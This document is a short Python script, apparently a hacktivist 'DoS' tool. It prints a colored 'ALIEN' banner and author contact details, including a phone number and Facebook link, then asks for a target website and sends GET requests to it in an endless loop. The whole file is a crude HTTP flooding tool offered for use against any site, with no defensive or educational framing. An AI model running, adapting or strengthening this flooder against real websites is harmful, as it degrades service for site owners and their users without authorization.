import requests
import os
os.system("clear")

# ANSI Color Codes
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BRIGHT_YELLOW = '\033[1;93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
ORANGE = '\033[38;5;214m'
PURPLE = '\033[95m'
RESET = '\033[0m'

# Gradient colors for ASCII art (only COLOR1 and COLOR2)
COLOR1 = '\033[38;5;46m'   # Bright Green
COLOR2 = '\033[38;5;82m'   # Light Green  

# Single colored author info
AUTHOR_COLOR = '\033[38;5;51m'  # Bright Cyan

# Get terminal width
terminal_width = os.get_terminal_size().columns

# ASCII art lines
ascii_lines = [
    COLOR1 + " █████╗ " + COLOR2 + "██╗     " + COLOR1 + "██╗" + COLOR2 + "███████╗" + COLOR1 + "███╗   ██╗" + RESET,
    COLOR2 + "██╔══██╗" + COLOR1 + "██║     " + COLOR2 + "██║" + COLOR1 + "██╔════╝" + COLOR2 + "████╗  ██║" + RESET,
    COLOR1 + "███████║" + COLOR2 + "██║     " + COLOR1 + "██║" + COLOR2 + "█████╗  " + COLOR1 + "██╔██╗ ██║" + RESET,
    COLOR2 + "██╔══██║" + COLOR1 + "██║     " + COLOR2 + "██║" + COLOR1 + "██╔══╝  " + COLOR2 + "██║╚██╗██║" + RESET,
    COLOR1 + "██║  ██║" + COLOR2 + "███████╗" + COLOR1 + "██║" + COLOR2 + "███████╗" + COLOR1 + "██║ ╚████║" + RESET,
    COLOR2 + "╚═╝  ╚═╝" + COLOR1 + "╚══════╝" + COLOR2 + "╚═╝" + COLOR1 + "╚══════╝" + COLOR2 + "╚═╝  ╚═══╝" + RESET
]

# Print centered ASCII art
for line in ascii_lines:
    # Remove color codes temporarily to calculate actual text length
    clean_line = line.replace(COLOR1, '').replace(COLOR2, '').replace(RESET, '')
    actual_length = len(clean_line)
    
    # Calculate padding needed to center the line
    padding = (terminal_width - actual_length) // 2
    centered_line = " " * padding + line
    
    print(centered_line)

print(AUTHOR_COLOR + """
Author: Ahasanul Haque AkaSh
Nickname: ALiEN
Team: Islamic Cyber Security Force
Facebook:https://www.facebook.com/profile.php?id=100090690904199
Whatsapp: +8801627096716
""" + RESET)
print()  # Empty line for spacing

# Green colored input prompt
target = input(GREEN + "Enter Your Targetted Site Link: " + RESET)

# Empty line after input
print()

# Display target site link in yellow
print(RED + "Your Targetted Site Link: " + RESET + YELLOW + target + RESET)

print()  # Empty line for spacing

# Add http:// if no protocol is specified
if not target.startswith(('http://', 'https://')):
    target = 'http://' + target

while True:
    try:
        r = requests.get(target)
        
        if r.status_code == 200:
            print(f"{YELLOW}{target}{RESET} {ORANGE}> status >= {r.status_code}{RESET} {CYAN}(success){RESET}")
        elif r.status_code >= 400:
            print(f"{YELLOW}{target}{RESET} {ORANGE}> status >= {r.status_code}{RESET} {RED}(error){RESET}")
        else:
            print(f"{YELLOW}{target}{RESET} {ORANGE}> status >= {r.status_code}{RESET} {BLUE}(other){RESET}")
            
    except requests.exceptions.RequestException as e:
        print(f"{RED}Error: {e}{RESET}")
        break
